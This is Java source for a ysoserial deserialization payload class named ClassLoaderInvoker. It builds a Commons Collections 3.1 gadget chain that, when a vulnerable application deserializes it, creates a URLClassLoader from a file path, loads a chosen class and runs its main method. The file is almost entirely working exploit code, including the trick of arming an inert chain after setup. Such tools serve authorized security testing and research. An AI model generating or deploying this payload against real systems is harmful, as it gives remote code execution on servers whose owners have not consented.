package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*								
	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class ClassLoaderInvoker extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	public InvocationHandler getObject(final String command) throws Exception {
		final String fileName = command.split(" ")[0];
		final String clazzName = command.split(" ")[1];
		final URL[] urlArray = new URL[]{ new URL("file://" + fileName)};
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(URLClassLoader.class),
				new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"newInstance", new Class[]{ URL[].class }}),
				new InvokerTransformer("invoke", new Class[] {
						Object.class, Object[].class }, new Object[] {
						null, new Object[]{ urlArray } }),
				new InvokerTransformer("loadClass", new Class[] {
					String.class}, new Object[] { clazzName }),
				new InvokerTransformer("getMethod", new Class[] {
						String.class, Class[].class }, new Object[] {
						"main", new Class[]{String[].class} }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[]{ new String[]{} } }),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ClassLoaderInvoker.class, args);
	}
}
